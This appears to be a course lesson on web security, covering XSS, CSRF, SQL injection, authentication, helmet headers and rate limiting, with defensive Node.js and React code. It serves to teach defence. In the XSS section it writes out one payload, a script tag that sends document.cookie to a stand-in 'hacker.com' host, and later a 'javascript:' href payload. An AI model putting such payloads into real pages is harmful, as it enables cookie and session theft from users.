# Week 39: Web Security

## 1. Overview (Why This Exists)
Building a feature that "works" is only 50% of the job. The other 50% is ensuring that feature can't be used to destroy your company. Every time you write a line of code, you are potentially opening a door for a hacker. **Web Security** is the practice of "Defensive Engineering." It’s about assuming the user is malicious and the network is compromised. This week, we learn about the "OWASP Top 10"—the most common ways apps are hacked—and how to harden your Node.js and React code so that your users' data stays exactly where it belongs: in your secure database.

## 2. Core Concepts

### 1. Cross-Site Scripting (XSS)
XSS happens when a hacker "injects" a malicious JavaScript script into your page. If you display a user's comment without cleaning it, a hacker can post: `<script>fetch('https://hacker.com?stolen_cookie=' + document.cookie)</script>`.
- **The Fix**: Never use `innerHTML` (Week 19). React escapes strings by default, which is a huge security win. Use libraries like `dompurify` if you *must* render raw HTML.

### 2. Cross-Site Request Forgery (CSRF)
CSRF is a "tricky link" attack. If you are logged into your bank and click a malicious link on a forum, that link can trigger a hidden `POST` request to your bank to "Transfer $1000 to Hacker." Since your browser sends your auth cookies automatically, the bank thinks it's a valid request from you.
- **The Fix**: Use **SameSite** cookie attributes and **CSRF Tokens** (unique, one-time strings) that the client must send with every state-changing request.

### 3. SQL Injection (Review)
As we learned in Week 31, this is injecting SQL commands via user input.
- **The Fix**: **ALWAYS** use Parameterized Queries (`$1, $2`). No exceptions.

### 4. Broken Authentication
Weak password policies, predictable session IDs, or not using HTTPS.
- **The Fix**: Use Bcrypt (Week 37) for hashing, enforce strong passwords, and **ONLY** serve your site over HTTPS. HTTPS encrypts the data so "Man-in-the-Middle" attackers can't see passwords or JWTs.

### 5. Defense in Depth: Security Headers
Use the **`helmet`** middleware in Express. It automatically sets several HTTP headers that tell the browser to be more restrictive (e.g., "Don't allow this site to be put in an iframe" to prevent clickjacking).

## 3. Code Examples

### Example 1: Hardening Express with Helmet
One line of code that prevents dozens of common attacks.

```javascript
const express = require('express');
const helmet = require('helmet'); // npm install helmet

const app = express();

// Helmet sets security headers like Content-Security-Policy, 
// X-Content-Type-Options, and more.
app.use(helmet());

app.use(express.json());

// ... rest of your routes ...
```

### Example 2: Preventing XSS in React (The Wrong vs. Right way)
Understanding React's built-in protection.

```jsx
// THE WRONG WAY (Dangerous)
function DangerousComment({ htmlContent }) {
    // This allows hackers to execute ANY script!
    return <div dangerouslySetInnerHTML={{ __html: htmlContent }} />;
}

// THE RIGHT WAY (React default)
function SafeComment({ textContent }) {
    // React automatically escapes strings. 
    // <script> becomes &lt;script&gt; and is rendered as plain text.
    return <div>{textContent}</div>;
}
```

### Example 3: Rate Limiting
Preventing "Brute Force" password guessing or DDOS attacks.

```javascript
const rateLimit = require('express-rate-limit'); // npm install express-rate-limit

const loginLimiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 5, // Limit each IP to 5 login attempts per window
    message: "Too many login attempts, please try again later."
});

// Apply only to sensitive routes
app.post('/api/login', loginLimiter, (req, res) => {
    // ... logic ...
});
```

## 4. Common Mistakes

### 1. "React is Safe Enough"
Thinking that because React escapes strings, you are immune to XSS. If you put a user's URL directly into an `<a>` tag's `href`, they can use `javascript:alert('XSS')` to bypass React's protection. **Always validate user-provided URLs.**

### 2. Trusting Client-Side Validation
Checking for a valid email only in React. A hacker won't use your frontend; they will use `curl` or Postman to send bad data directly to your API. **Always validate data on the Backend.**

### 3. Missing `HttpOnly` on Cookies
Storing your JWT in a cookie that JavaScript can read. If an XSS attack happens, the hacker can steal the token. **Set `httpOnly: true` on your auth cookies.** This makes the cookie invisible to JavaScript but visible to the browser's network requests.

### 4. Logging Sensitive Data
Logging `req.body` to your terminal for debugging and accidentally putting a user's plain-text password in your log files. **Filter out sensitive fields before logging.**

## 5. Mental Model
Imagine your application is a **Medieval Castle**.
- **The Walls** are HTTPS. They stop anyone outside from seeing what's happening inside.
- **The Moat** is the Rate Limiter. It slows down the speed at which enemies can approach the gate.
- **The Guard at the Gate** is the Auth Middleware. They check ID (JWT).
- **The Script Reviewer** is React's Auto-Escaping. They check every letter that comes into the castle to make sure it's not a hidden bomb.
- **Defense in Depth** means even if an enemy gets over the wall, they still have to get past the moat and the guards. One single layer is never enough.

## 6. Key Takeaways
- **Sanitize Input, Escape Output**: The golden rule of web security.
- React is safe by default, but `dangerouslySetInnerHTML` and `href` are escape hatches for hackers.
- Use **`helmet`** to secure your HTTP headers.
- **Rate Limit** your sensitive routes (Login, Register).
- **HTTPS** is mandatory; without it, all other security is useless.
- Use **`HttpOnly`** and **`Secure`** flags for your session cookies.
- **Never trust the client.**

## 7. What's Next
You have built a secure, professional, fullstack application. You are now a "Product-Ready" engineer. But a real product needs more than just your own data; it needs to integrate with the outside world. Next week, we move into **Third-party APIs**. We’ll learn how to handle complex external integrations like image uploads (Cloudinary/AWS) and payment flows (Stripe), turning your app into a real business tool.
